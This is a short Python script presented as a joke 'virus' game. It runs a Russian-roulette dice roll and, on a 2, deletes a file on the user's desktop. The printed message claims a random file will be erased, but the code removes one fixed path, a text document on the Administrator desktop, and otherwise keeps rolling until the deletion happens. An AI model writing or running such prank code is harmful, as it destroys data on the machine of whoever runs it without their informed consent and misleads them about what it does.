import os
import time
import random

def Del():
    path = "C:/Users/Administrator/Desktop/New Text Document.txt"
    os.remove(path)
    print("ups an file has been deleted, and this file has ")
    print(path)

def Core():
 print("Hi, u openwd da B4mb1 Virus, this game is the russian roulette, if da number generated"
       " is 2, a random file of u cumputer will be erased")
 time.sleep(2)
 print("so let plai")
 res = random.randint(1,6)
 print(res)

 if res == 2:
     Del()
     print("f")
 elif res != 2:
    print("u saved")
    time.sleep(2)
    print("again")
    time.sleep(1)
    Core()

Core()